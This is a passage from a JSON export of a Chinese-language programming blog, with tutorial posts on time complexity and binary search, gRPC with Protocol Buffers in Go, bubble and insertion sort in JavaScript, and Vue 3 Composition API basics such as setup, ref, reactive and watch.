[\u0026#34;卡丘\u0026#34;,\u0026#34;胖丁\u0026#34;,\u0026#34;尼龜\u0026#34;,\u0026#34;比獸\u0026#34;,\u0026#34;呆獸\u0026#34;,\u0026#34;種子\u0026#34;,\u0026#34;小剛\u0026#34;] for Pokemon in Pokemons: if Pokemon == \u0026#34;呆獸\u0026#34;: print(\u0026#34;找到呆獸！\u0026#34;) break else: print(\u0026#34;這個櫃子裡不是呆獸\u0026#34;) 觀察上面的程式碼時，我們可以發現，如果呆獸在第 0 號櫃，我們一個步驟就會找到它，但如果他是在第 6 號櫃，我們要花七個步驟才能找到他。\n還記得我們在上面提過的小小提醒嗎？我們通常會用程式執行會碰到的「最壞狀況」來決定複雜度的表示，也因此，當我們要從 n 個櫃子中找到一隻特定的神奇寶貝，我們最慘最慘的情況需要花剛好 n 個步驟才能找到（想像要找的神奇寶貝在最後一個櫃子的情況）。像這樣的案例，我們就會說簡易搜尋演算法的時間複雜度為 O(n)。\nO(log n)：二分搜尋法 說明 時間複雜度為 O(log n) 的演算法（這邊的 log 都是以二為底），代表當輸入的數量是 n 時，執行的步驟數會是 log n。（讓忘記 log 是什麼的同學們複習一下，當 log n = x 的意思是 n = 2^x，如果這部分的腦細胞尚未復活，且讓我們先記住 n = 2^x，再來看看例子）。\n舉例來說，當 n = 4，程式會在 2 個步驟完成（4 = 2²）；n = 16 時，程式會在 4 個步驟完成（16 = 2⁴），以此類推。\n在程式中，O(log n) 的最常見例子是二分搜尋法。\n二分搜尋法 假設我們在一本字典中想要找到一個單字，這個字以 W 開頭，我們可以用前面提過「簡易搜尋」的邏輯，從第一頁的 A 開始找起，一個一個找到天荒地老海枯石爛。也可以用更珍惜生命的方式，直接翻到字典的後面，找到以 W 開頭的第一個字後再開始往後找。\n同樣的邏輯，假設有一長串有小到大排序好的數字們，我要在其中找特定一個數字，我們一樣可以從第一個往後一個一個檢查。但假設我們想要更珍惜生命，聰明的讀者可能已經想到了我們在「終極密碼」這種遊戲中會使用的策略，也就是每次都先檢查最中間的數字，如果中間的數字比我們要找的數字大，我們要找的數量就只剩原本的一半（因為在後段的數字顯然都會比我們要找的數字大），這樣的方法，就稱作二分搜尋法。\n舉一個實際的例子，假設今天有一排編號好的櫃子，裡面擺著八個由小到大排序好的數字。假設我們知道裡面的數字包含 55，但我們不知道在哪一個編號櫃子中。讓我們來比較簡易搜尋（從第一格往後一個一個檢查）跟二分搜尋法有什麼差別。\n從上面的圖可以看到，一般的搜尋方法需要花五個步驟才能找到 55。\n而在二分搜尋法中，我們先打開最中間的櫃子，發現裡面的數字是 41。因為 55 比 41 大，因此我們知道從一號櫃到三號櫃都不會有 55，接下來只需要檢查五號櫃到七號櫃。\n同樣的邏輯，我們打開剩下三個可能性中最中間的櫃子，發現六號櫃裡面的數字是 61，因為 61 比 55 大，我們可以知道七號櫃的數字一定也比 55 大，得知 55 一定就在五號櫃之中。\n接下來，要再次來關心兩個搜尋方法的時間複雜度。簡易搜尋的情況中，我們可以輕鬆地知道最壞的情況就是剛好七個步驟（要找的數字是 80 ）。而二分搜尋法，我們可以先練習去計算各種情況需要的步驟，而最終的答案如下表：\n從上表我們可以發現，二分搜尋法最慘最慘，也只需要三個步驟。\n推廣到有 n 個櫃子時，我們可以發現：二分搜尋法在每進行一個步驟時，就可以排除掉一半的可能性。每次都能減少一半，因此二分搜尋法最糟最糟也只需要以 2 為底的 log n 個步驟就能完成。\n二分搜尋法在程式碼中的例子，對於程式新手可能需要花比較多的理解。如果你是對程式有一定理解的人，可以嘗試動手實做看看。而如果下方的程式碼對於讀者還有些吃力的話，也可以先多多熟悉語法後回來複習即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Numbers = [5,17,33,41,55,61,80] Find = 55 ​ low = 0 high = len(Numbers) - 1 ​ while low \u0026lt;= high: mid = (low + high) // 2 if Numbers[mid] \u0026gt; Find: high = mid - 1 elif Numbers[mid] \u0026lt; Find: low = mid + 1 else: break ​ print(mid) 小結 在這篇文章中，我們分別了解了 O(1)、O(n)、O(logn) 的時間複雜度，以及對應到的三個常見演算法。而在接下來的文章中，我們會開始認識新朋友，在演算法中佔有重要地位的「排序法」，以及在更進階的例子。\n","date":"2022-07-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52276285230_7f886f0bca_o.jpg","permalink":"https://wayneblog.ga/2022-07-23/common-time-complexity/","title":"初學者學演算法｜從時間複雜度認識常見演算法"},{"content":" 剛剛用日常上班前挑衣服的例子和沒學過程式的 00 說明時間複雜度的概念很好理解耶～！\n例子是這樣的\u0026hellip;\n一早要出門的時候，想要從衣櫃中找出紅色的上衣。\n其中一種方式是像左圖一樣，這是掏寶上很熱門的「疊衣服褲子收納神器」，雖然看起來整理的很乾淨，但如果你要從中找到紅色的衣服，你就得要由上而下一件一件找，最糟的情況就是一直翻到最下面才能找到你要的紅色衣服。\n另一種方式是像右圖一樣，把衣服用立起來的方式，一眼就可以看到紅色的衣服在哪，直接拿出來，幾乎不用找。\n左圖的那種方式，時間複雜的就是 O(n)，n 就是衣服的件數，雖然紅色的衣服有可能就放在最上面，一眼就可以看到，但在探討時間複雜度的時候都要考慮最差的情況，所以如果你有 n 件衣服，最差的情況就是要把 n 件衣服都翻過才會找到紅色那件。\n右圖的方式它的時間複雜度是 O(1)，在你沒有忘記其實衣服已經被丟到洗衣籃的前提下，你看一眼，翻都不用翻就可以把紅衣服直接取出（請先忽略掉人腦內建的視覺搜尋系統，那是另一個有趣的故事 XD）。這種不用一個一個找，就直接取出的，時間複雜度就是 O(1)。\n有了這個時間複雜度的概念後，是不是覺得左邊的那個商品實用性沒這麼高啦～ XDD\n真的是沒想到學演算法還可以用在購物吧！\n","date":"2022-07-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52276282210_c2a38fae3c_o.jpg","permalink":"https://wayneblog.ga/2022-07-23/learn-time-complexity-by-clothes/","title":"從找衣服了解時間複雜度"},{"content":" 參考網站 - gRPC 說明影片 @ BESG\nSOURCE CODE\n對應的程式碼可檢視 besg-grpc 的 repository。\ngRPC 是什麼：以 Golang 說明與實作 說明 RPC 的全名是 remote procedure call，主要是作為電腦和電腦間溝通使用。A 電腦可以呼叫 B 電腦執行某些程式，B 電腦會將結果回傳給 A 電腦，A 電腦在收到回應後會再繼續處理其他任務。RPC 的好處在於，雖然 A 電腦是發送請求去請 B 電腦做事，但其呼叫的方式，就很像是 A 電腦直接在呼叫自己內部的函式一般。\ngRPC 也是基於這樣的概念，讓想要呼叫 server 處理請求的 client，在使用這支 API 時就好像是呼叫自己內部的函式一樣簡單自然。從功能面來說，gRPC 就像 Web 常用的 Restful API 一樣，都是在處理請求和回應，並且進行資料交換，但 gRPC 還多了其他的功能和特色。\ngRPC 是由 Google 開發的開源框架，它快速有效、奠基在 HTTP/2 上提供低延遲（low latency），支援串流，更容易做到權限驗證（authentication）。在下面的文章中，將會對於 gRPC 能提供的特色有更多說明。\nProtocol Buffers 是什麼 Protocol Buffers @ Google Developer Protocol Buffers 筆記 @ pjchender.dev 在學習 gRPC 時，需要同時了解什麼是 Protocol Buffers。在傳統的 Restful API 中，最常使用的資料交換格式通常是 JSON；但到了 gRPC 中，資料交換的格式則是使用名為 Protocol Buffers 的規範／語言。\njson 1 2 3 4 5 { \u0026#34;firstName\u0026#34;: \u0026#34;Sushiro\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;Global\u0026#34;, \u0026#34;age\u0026#34;: 6 } protocol buffers 1 2 3 4 5 6 // Protocol Buffers message User { string first_name = 1; string last_name = 2; int32 age = 3; } 也就是說，當我們想要使用 gRPC 的服務來交換資料前，必須先把資料「格式」和「方法」都定義清楚。\nTIP:\n使用 gRPC 前，不只需要先把資料交換的格式定義清楚，同時也需要把資料交換的方法定義清楚。\n這裡要稍微釐清一點很重要的是，Protocol Buffers 可以獨立使用，不一定要搭配 gRPC；但使用 gRPC 一定要搭配 Protocol Buffers。\n實作將 Protocol Buffers 編譯成在 Golang 中可使用的檔案 對應的程式碼可檢視 besg-grpc repository 中的 proto 資料夾。\nSTEP 1：撰寫 Protocol Buffers 檔案 使用 message 定義資料交換的格式。 使用 service 定義呼叫 API 的方法名稱。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 syntax = \u0026#34;proto3\u0026#34;; // 定義要使用的 protocol buffer 版本 package calculator; // for name space option go_package = \u0026#34;proto/calculator\u0026#34;; // generated code 的 full Go import path message CalculatorRequest { int64 a = 1; int64 b = 2; } message CalculatorResponse { int64 result = 1; } service CalculatorService { rpc Sum(CalculatorRequest) returns (CalculatorResponse) {}; } STEP 2：安裝編譯 Protocol Buffer 所需的套件 此部份可參考 編譯 Protocol Buffers（Compiling） 段落。\n安裝 compiler (macOS) 1 2 3 4 5 6 7 8 9 10 11 # 安裝 compiler，安裝完後就會有 protoc CLI 工具 brew install protobuf protoc --version # Ensure compiler version is 3+ # --- 使用 golang 才需要安裝以下兩個套件 --- # 安裝 protoc-gen-go 後可以將 proto buffer 編譯成 Golang 可使用的檔案 go get github.com/golang/protobuf/protoc-gen-go # 安裝 grpc-go 後，可以在 Golang 中使用 gRPC go get -u google.golang.org/grpc STEP 3：編譯 Protocol Buffer 檔案 進到放有 .proto 檔的資料夾後，在終端機輸入下述指令：\n1 protoc *.proto --go_out=plugins=grpc:. --go_opt=paths=source_relative 在成功編譯好後，應該會看到同樣的資料夾位置出現 *.pb.go 的檔案，這就是編譯好後可以在 Golang 中使用 Protocol Buffer 和 gRPC 的檔案。\n實作 gRPC Server 對應的程式碼可檢視 besg-grpc repository 中的 server 資料夾。\nSTEP 1：建立 gRPC server 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 type Server struct {} func main() { fmt.Println(\u0026#34;starting gRPC server...\u0026#34;) lis, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;localhost:50051\u0026#34;) if err != nil { log.Fatalf(\u0026#34;failed to listen: %v \\n\u0026#34;, err) } grpcServer := grpc.NewServer() calculatorPB.RegisterCalculatorServiceServer(grpcServer, \u0026amp;Server{}) if err := grpcServer.Serve(lis); err != nil { log.Fatalf(\u0026#34;failed to serve: %v \\n\u0026#34;, err) } } STEP 2：實作 Protocol Buffer 中的 service 1 2 3 4 5 6 7 8 9 10 11 12 func (*Server) Sum(ctx context.Context, req *calculatorPB.CalculatorRequest) (*calculatorPB.CalculatorResponse, error) { fmt.Printf(\u0026#34;Sum function is invoked with %v \\n\u0026#34;, req) a := req.GetA() b := req.GetB() res := \u0026amp;calculatorPB.CalculatorResponse{ Result: a + b, } return res, nil } STEP 3：啟動 server 在終端機中輸入：\n1 go run server/server.go 即可啟動 gRPC server。\n補充：使用 Bloom RPC 進行測試 在只有 server 的情況下，可以使用 BloomRPC 這套工具來模擬 Client 對 gRPC server 發送請求，功能就類似在 Restful 中使用的 Postman。\n使用時只需要匯入 proto 檔後，即可看到對應可呼叫的方法和可帶入的參數，能這麼方便也是因為在 protocol buffer 中已經把傳輸的資料格式和能對應呼叫的方法都定好的緣故。\n實作 gRPC Client 完整程式碼可檢視 besg-grpc repository 中的 client 資料夾。\nSTEP 1：與 gRPC server 建立連線 1 2 3 4 5 6 7 8 9 10 11 12 func main() { conn, err := grpc.Dial(\u0026#34;localhost:50051\u0026#34;, grpc.WithInsecure()) if err != nil { log.Fatalf(\u0026#34;failed to dial: %v\u0026#34;, err) } defer conn.Close() client := calculatorPB.NewCalculatorServiceClient(conn) doUnary(client) } STEP 2：使用 Protocol Buffers 中定義好的 Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 func doUnary(client calculatorPB.CalculatorServiceClient) { fmt.Println(\u0026#34;Staring to do a Unary RPC\u0026#34;) req := \u0026amp;calculatorPB.CalculatorRequest{ A: 3, B: 10, } res, err := client.Sum(context.Background(), req) if err != nil { log.Fatalf(\u0026#34;error while calling CalculatorService: %v \\n\u0026#34;, err) } log.Printf(\u0026#34;Response from CalculatorService: %v\u0026#34;, res.Result) } STEP 3：向 server 發送請求 在終端機中輸入：\n1 go run client/client.go 即可執行 client.go 並向剛剛起動好的 server 發送請求。\ngRPC 解決了什麼 gRPC 和 REST API 的比較 比較 gRPC 服務與 HTTP API @ microsoft docs\n簡單來說，gRPC 在效能上比起 REST API 好非常多：\n項目 gRPC Restful API 資料傳輸格式（Payload） Protocol Buffer - 更快且更小 JSON, XML, formData - 較慢且較大 通訊協定 HTTP/2 HTTP 傳輸方式 支援一般的「請求-回應」、伺服器端串流、Client 端串流、與雙向串流（streaming） 僅能透過 Client 發送請求、Server 給予回應 API 方法命名 沒有限制，一般會直接描述該方法要做的事，例如 createUser, getUser。不需要思考路由命名。 使用動詞（GET, POST, PUT, PATCH, DELETE）搭配資源來命名。需要根據不同的行為來定義不同的路由。 Client 呼叫 API 的方式 就像呼叫一般的函式 透過特定的 Endpoint，給予符合的資料型別 Server 建立 API 的方式 根據文件（Protocol Buffer）實作功能，不需要額外檢查資料型別與方法正確性。 根據文件（Swagger）實作功能，但須額外檢查資料型別。 根據文件產生程式碼 Protocol Buffers OpenAPI / Swagger 此外，gRPC 的 server，預設就是非同步的，因此不會阻塞任何進來的請求，並可以平行處理多個請求。gRPC Client 則可以選擇要用同步（阻塞）或非同步的方式處理。\n使用 Protocol Buffers 的好處 節省網路傳輸量：速度更快、檔案更小 節省 CPU 消耗：Parse JSON 本身是 CPU intensive 的任務；Parse Protocol Buffer（binary format）因為更接近底層機器表徵資料的方式，消耗的 CPU 資源較低 跨程式語言：Protocol Buffer 可以根據不同的程式語言編譯出不同的檔案 可以寫註解、型別清楚明確 TIP\n節省網路傳輸量和 CPU 消耗在行動裝置上的影響可能更重要。\n跨程式語言的好處 透過 Protocol Buffer 定義好資料的傳輸欄位（message）和呼叫的方法（service）後，gRPC 即可在不同程式語言上運行，這非常適合微服務（micro-services）的應用情境，只要雙方一起定義好 schema 後，就可以用不同的程式語言進行開發。\n使用 HTTP/2 的好處 HTTP/2 vs HTTP/1 - Performance Comparison? Demo：Performance difference between HTTP2 and HTTP1.1 瀏覽器允許的併發請求資源數是有限制的-分析 @ ITRead01 傳統的 HTTP/1.1 在每個 TCP 連線中只允許向 server 發送單一個請求，但當網頁載入時，往往會需要向同一個伺服器發送多個請求（例如、圖檔、CSS、靜態檔、JS 等），因此為了要避開這樣的限制、加快載入的速度，瀏覽器會實作多個平行的（parallel） TPC 連線（每個瀏覽器實作不同，因此數量的上限也不同），以處理同時向伺服器發出的多個請求。\n在 HTTP/2 中則可在同一個 TCP 連線中進行多個請求和回應，並且可以由 server 主動推送資源給 client，而並非一定要透過 client 主動請求；此外支援 HTTP Header 的壓縮，減少資料傳數量；HTTP/2 也是使用 binary 的方式在傳輸資料。\ngRPC 的四種類型 Unary：類似傳統 API，client 發送 request 而 server 回傳 response Server Streaming：透過 HTTP/2，client 發送一次 request，而 server 可以回傳多次資料 Client Streaming：client 發送多次資料，直到告知 server 資料傳完後，server 再給予 response Bi Directional Streaming：兩邊都用串流的方式傳送資料 圖片來源：gRPC Golang - Master Class: Build Modern API \u0026amp; MicroServices @ Udemy\n1 2 3 4 5 6 7 8 9 10 11 12 13 service GreetService { // Unary rpc Greet(GreetRequest) returns (GreetResponse) {}; // Streaming Server rpc GreetManyTimes(GreetManyTimesRequest) returns (stream GreetManyTimesResponse) {}; // Streaming Client rpc LongGreet(stream LongGreetRequest) returns (LongGreetResponse) {}; // Bi-directional Streaming rpc GreetEveryone(stream GreetEveryoneRequest) returns (stream GreetEveryoneResponse) {}; } gRPC 的缺點 Protocol Buffer 不像 JSON 是 Human Readable。 需要額外的學習時間和導入成本。 瀏覽器原生目前還不支援，須透過套件 grpc-web 來處理。 其他 推薦工具 BloomRPC：方便用來模擬 Client 對 gRPC server 發送請求，功能就類似在 Restful 中使用的 Postman。 錯誤排除 protoc-gen-go: program not found or is not executable\n1 2 # 需要把 $GOPATH/bin 加到 .zshrc/.bashrc 等 $ echo \u0026#39;export PATH=$PATH:$GOPATH/bin\u0026#39; \u0026gt;\u0026gt; $HOME/.zshrc 參考資料 Go Tutorial @ gRPC.io Introduction to gRPC @ gRPC.io Protocol Buffers @ Google Developer gRPC - Golang Master Class: Build Modern API \u0026amp; MicroServices @ Udemy 比較 gRPC 服務與 HTTP API @ Microsoft Docs ","date":"2022-07-22T00:00:00Z","image":"https://live.staticflickr.com/65535/52276040314_2afa0e7026_o.png","permalink":"https://wayneblog.ga/2022-07-22/grpc-basic-introduction/","title":"gRPC 基本介紹"},{"content":" 參考網站 - JavaScript 資料結構與演算法：氣泡排序 Bubble Sort、插入排序 Insertion Sort 實作與分析 - 彭彭直播\n排序演算法 氣泡排序法(bubble sort) 概要 使用雙層迴圈，由後往前。 每輪固定最右邊的值，接著倆倆比較大小，將大的放右邊。 下輪則 - 1。 完畢後即可排序完畢。 執行的總輪數為陣列長度 - 1。 時間複雜度 如果陣列長度是 4，要比對 3+2+1 總共 6 次。 如果陣列長度是 7，要比對 6+5+\u0026hellip;+1 總共 21 次。 如果陣列長度是 n，要比對 (n-1)+(n-2)+\u0026hellip;+1 總共\n(n * (n - 1)) / 2 = n²/2 - n/2 次 搜尋所需時間隨著陣列的長度\n呈平方成長 O(N²)。 假設 可以加入一個 flag 來做判定，假設比較完第一輪發現沒有交換的情況發生，則代表已經排序完成，不需要再跑下一輪，即可稍微優化排序。 實作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 實作氣泡排序演算法 function bubbleSort(arr){ // arr 是一個數字陣列 for(let i=arr.length-1;i\u0026gt;=1;i--){ let swap=false; // 假設沒有交換發生 for(let j=0;j\u0026lt;i;j++){ if(arr[j]\u0026gt;arr[j+1]){ // 如果順序不對，交換 let temp=arr[j]; arr[j]=arr[j+1]; arr[j+1]=temp; swap=true; // 紀錄發生交換 } } if(!swap){ // 發現一整輪中都沒有交換發生，直接判定排序完成 break; } } } let data = [1, 6, 3, 4]; console.log(bubbleSort(data)); 輸出： 1 \u0026gt; [1, 3, 4, 6] 插入排序法(insertion sort) 概要 使用雙層迴圈，由前往後。 從第二筆開始，每輪將該筆資料往前比較大小，將大的放右邊：每輪比較從 (i - 1) ~ 0。 下輪則 + 1。 完畢後即可排序完畢。 執行的總輪數為陣列長度 - 1。 時間複雜度(複雜度同氣泡排序法) 如果陣列長度是 4，要比對 1+2+3 總共 6 次。 如果陣列長度是 7，要比對 1+2+\u0026hellip;+6 總共 21 次。 如果陣列長度是 n，要比對 1+2+\u0026hellip;+(n-1) 總共\n(n * (n - 1)) / 2 = n²/2 - n/2 次 搜尋所需時間隨著陣列的長度\n呈平方成長 O(N²)。 假設 假設當前比對的值與第一個要比較的值一比較，恰好正確，則代表前面皆已經排序完成，可以進到下一輪。 實作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // 實作插入排序演算法 function insertionSort(arr){ // arr 是一個數字陣列 for(let i=1;i\u0026lt;arr.length;i++){ for(let j=i-1;j\u0026gt;=0;j--){ if(arr[j]\u0026gt;arr[j+1]){ // 如果順序不對，交換 [arr[j], arr[j+1]]=[arr[j+1], arr[j]]; // javascript 交換的語法糖 }else{ // 任何一次比較，發現順序對了，這一輪就不用繼續了 break; } } } } let data = [1, 6, 3, 4]; console.log(insertionSort(data)); 輸出： 1 \u0026gt; [1, 3, 4, 6] 大型資料量的進階探討 O(N²)：(讀作 big-O N平方) 是相當可怕的，排序的執行時間將會是資料量的平方倍數成長。\n演示： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // 產生隨機資料 let data=[]; for(let i=0;i\u0026lt;100000;i++){ data.push(Math.random()*1000000); } // 資料量是 100,000，我的演算法時間複雜度是 O(N^2)，預期要花 100,000^2 = 10,000,000,000 次的比較運算 // 我們的電腦一秒鐘跑 10 億個指令(粗略預估 1 GB) console.time(); // 插入排序法，大約跑了10幾秒 //insertionSort(data); // 使用 JavaScript 內建的排序功能 sort()，大約跑了 0.2 ~ 0.3 秒 // 很有機會是使用快速排序 Quick Sort(快速排序法) 或其變形 data.sort(); console.timeEnd(); ","date":"2022-07-21T00:00:00Z","image":"https://wayneblog.ga/2022-07-21/bubble-sort-and-insertion-sort/hqdefault_huc19c1d5e8083f3ca093a0303b2a8247b_19175_120x120_fill_q75_box_smart1.jpg","permalink":"https://wayneblog.ga/2022-07-21/bubble-sort-and-insertion-sort/","title":"彭彭的課程 - 氣泡排序、插入排序的實作與分析"},{"content":" 參考網站 - 尚硅谷Vue3技術\n創建 Vue 3.0 工程 使用 vue cli 創建 官方文檔：https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create 1 2 3 4 5 6 7 8 9 10 11 12 ## 查看 @vue/cli 版本，確保 @vue/cli 版本在 4.5.0 以上 vue --version ## 安裝或升級你的 @vue/cli npm install -g @vue/cli ## 創建 vue create vue_test ## 啟動 cd vue_test npm run serve 使用 vite 創建(Vue作者的團隊開發) 官方文檔：https://v3.cn.vuejs.org/guide/installation.html#vite vite官網：https://vitejs.cn/ 優勢： 開發環境中，無需打包操作，可快速的冷啟動。 輕量快速的熱重載(HMR)。 真正的按需編譯，不再等待整個應用編譯完成。 傳統 grunt、gulp、webpack 與 vite 構建對比圖： 1 2 3 4 5 6 7 8 9 10 11 ## 創建工程 npm init vite-app \u0026lt;project-name\u0026gt; ## 進入工程目錄 cd \u0026lt;project-name\u0026gt; ## 安裝依賴 npm install ## 啟動 npm run dev 安裝 Vue 開發者工具 Vue.js devtools\n拉開序幕的 Setup Vue3.0 中一個新的配置項，值為一個函數。 是所有 Composition API (組合式API) 的表演舞台。 組件中所用到的數據、方法等等，均要配置在 setup 中。 setup 函數的： 若返回一個對象，則對象中的屬性、方法，在模板中均可直接使用。(重點關注!) 若返回一個渲染函數，則可以自定義渲染內容。(了解即可) 返回對象 1 2 3 4 5 6 7 8 export default { setup() { const name = \u0026#34;測試\u0026#34; return { name } } } 返回渲染函數(需引入 h ) 1 2 3 4 5 6 import { h } from \u0026#34;vue\u0026#34; export default { setup() { return () =\u0026gt; { return h(\u0026#39;h1\u0026#39;, \u0026#39;尚硅谷\u0026#39;)} } } 注意： 不要與Vue2.x配置混用。 Vue2.x配置(data、methods、computed\u0026hellip;)中可以訪問到setup中的屬性、方法，但在setup中不能訪問到Vue2.x配置(data、methods、computed\u0026hellip;)。 如果有重名，setup優先。 setup 不能是一個 async 函數，因為返回值不再是 return 的對象，而是一個 promise，模板看不到 return 對象中的屬性；後期可以返回一個 Promise 實例，但需要 Suspense 與 異步組件(動態組件) 的配合：點我前往 Suspense ref 函數 作用：定義一個響應式的數據。 語法： 1 const xxx = ref(initValue) 將數據加工成一個 RefImpl (Reference: 引用；Implete: 實現) = (引用實現的實例對象)。 js 中操作數據：xxx.value。 模板中讀取數據：\u0026lt;div\u0026gt;{{xxx}}\u0026lt;/div\u0026gt; 備註： 接收的數據可以是基本類型，也可以是對象類型。 基本類型的數據：響應式依然是靠 Object.defineProperty() 的 get 與 set 完成的。 對象類型的數據：內部求助了 Vue3.0 中的一個新函數\u0026mdash;- reactive reactive 函數 作用：定義一個對象類型的響應式數據(基本類型別用他，用ref函數)。 語法： 1 2 3 4 const xxx = reactive({ name: \u0026#34;測試\u0026#34;, age: 18 }) 接收一個對象或數組，返回一個代理對象(Proxy對象)。 reactive 定義的響應式數據是深層次的。 內部基於 ES6 的 Proxy 實現，通過代理對象操作源對象內部數據都是響應式的，並通過 Reflect 操作源對象內部的數據。 js、模板中操作數據均不需要 .value Vue 2.0 中的響應式原理 實現原理： 對象類型：通過 Object.defineProperty() 對屬性的讀取、修改進行攔截(數據劫持)。 數組類型：通過重寫更新數組的一系列方式來實現攔截。(對數組的變更方法進行了包裹)。 1 2 3 4 5 6 7 8 Object.defineProperty(data, \u0026#34;count\u0026#34;, { get() { }, set() { } }) 原理模擬： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 let person = { name: \u0026#34;張三\u0026#34;, age: 18 } // 模擬 Vue2 中實現響應式 let p = {} Object.defineProperty(p, \u0026#34;name\u0026#34;, { configurable: true, // 允許刪除，但捕獲不到 get() { // 有人讀取 name 時調用 return person.name }, set(value) { console.log(\u0026#34;有人修改了 name 屬性，我發現了ㄛ，我要去更新介面！\u0026#34;) person.name = value } }) Object.defineProperty(p, \u0026#34;age\u0026#34;, { configurable: true, // 允許刪除，但捕獲不到 get() { // 有人讀取 age 時調用 return person.age }, set(value) { console.log(\u0026#34;有人修改了 age 屬性，我發現了ㄛ，我要去更新介面！\u0026#34;) person.age = value } }) 存在問題： 新增屬性、刪除屬性，介面不會更新，需使用 $set、$delete。 直接通過下標修改數組，介面不會更新，需使用 $set、$delete。 問題情況演示： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 export default { data() { return { person: { name: \u0026#34;張三\u0026#34;, age: 18, hobby: [\u0026#34;學習\u0026#34;, \u0026#34;吃飯\u0026#34;] } } }, methods: { addSex() { this.person.sex = \u0026#34;女\u0026#34; // 此時畫面不會更新 this.$set(this.person, \u0026#34;sex\u0026#34;, \u0026#34;女\u0026#34;) // 需使用 $set 畫面才會更新 // 或是使用 Vue.set() // Vue.set(this.person, \u0026#34;sex\u0026#34;, \u0026#34;女\u0026#34;) }, deleteName() { delete this.person.name // 此時畫面不會更新 this.$delete(this.person, \u0026#34;name\u0026#34;) // 需使用 $delete 畫面才會更新 // 或是使用 Vue.delete() // Vue.delete(this.person, \u0026#34;name\u0026#34;) }, updateHobby() { this.person.hobby[0] = \u0026#34;逛街\u0026#34; // 此時畫面不會更新 this.$set(this.person.hobby, 0, \u0026#34;逛街\u0026#34;) // 需使用 $set 畫面才會更新 // 或是使用 splice() // this.person.hobby.splice(0, 1, \u0026#34;逛街\u0026#34;) } } } Vue 3.0 中的響應式原理 實現原理： 通過 Proxy(代理)：攔截對象中任意屬性的變化，包含屬性值的讀寫、屬性的新增、屬性的刪除等。 通過 Reflect(反射)：對被代理對象的屬性進行操作。 原理模擬： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 let person = { name: \u0026#34;張三\u0026#34;, age: 18 } // 模擬 Vue3 中實現響應式 const p = new Proxy(person, { // 有人讀取p的某個屬性時調用 get(target, propName) { console.log(`有人讀取了p身上的${propName}屬性`) return Reflect.get(target, propName) }, // 有人新增或修改p的某個屬性時調用 set(target, propName, value) { console.log(`有人修改了p身上的${propName}屬性，我要去更新介面了！`) Reflect.set(target, propName, value) }, // 有人刪除p的某個屬性時調用 deleteProperty(target, propName) { console.log(`有人刪除了p身上的${propName}屬性，我要去更新介面了！`) return Reflect.deleteProperty(target, propName) } }) setup 的兩個注意點 setup 執行的時機：在 beforeCreate 之前執行一次，this 是 undefined。 setup 的參數 props：值為對象，包含：組件外部傳遞過來，且組件內部聲明接收了的屬性。 context：上下文對象： attrs：值為對象，包含：組件外部傳遞過來，但沒有在 props 配置中聲明的屬性，相當於 Vue 2.0 的 this.$attrs。 slots：接收的插槽內容，相當於 Vue 2.0 的 this.$slots。 emit：分發自定義事件的函數，相當於 Vue 2.0 的 this.$emit。 watch 函數 與 Vue 2.0 中的 watch 配置功能一致。 兩個小\u0026quot;坑\u0026quot;： 監視 ref 定義的響應式數據時，不需加 .value。 監視 reactive 定義的響應式數據時，oldValue 無法正確捕獲、強制開啟了深度監視(deep配置失效)。 監視 reactive 定義的響應式數據中的某個屬性時，deep 配置有效。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 import { ref, reactive, watch } from \u0026#34;vue\u0026#34; export default { setup() { const sum = ref(10) const msg = ref(\u0026#34;測試\u0026#34;) const person = reactive({ name: \u0026#34;張三\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) // 情況一：監視 ref 定義的響應式數據 watch(sum, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;sum變化了\u0026#34;, newValue, oldValue) }, { immediate: true }) // 情況二：同時監視多個 ref 定義的響應式數據 watch([sum, msg], (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;sum或msg變化了\u0026#34;, newValue, oldValue) }, { immediate: true }) /* * 情況三：監視 reactive 定義的響應式數據的全部屬性 * 1. 注意: 此數無法正確的獲取 oldValue * 2. 注意: 強制開啟了深度監視(deep配置無效) */ watch(person, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;person變化了\u0026#34;, newValue, oldValue) }, { immediate: true, deep: false }) // 此處的 deep 配置無效 // 情況四：監視 reactive 定義的響應式數據的某個屬性 watch(() =\u0026gt; person.name, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;person的name變化了\u0026#34;, newValue, oldValue) }, { immediate: true }) // 情況五：監視 reactive 定義的響應式數據的某些屬性 watch([() =\u0026gt; person.name, () =\u0026gt; person.age], (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;person的name或age變化了\u0026#34;, newValue, oldValue) }, { immediate: true }) // 特殊情況：監視 reactive 定義的響應式數據的某些對象屬性 watch(() =\u0026gt; person.job, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;person的job變化了\u0026#34;, newValue, oldValue) }, { immediate: true, deep: true }) // 此處由於監視的是 reactive 所定義的對象中的某個屬性，所以 deep 配置有效 return { sum, msg } } } watch 時 value 的問題 若監視的數據為 ref 求助 reactive 生成的響應式數據，則可使用以下兩種方式進行監視： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import { ref, watch } from \u0026#34;vue\u0026#34; export default { setup() { const sum = 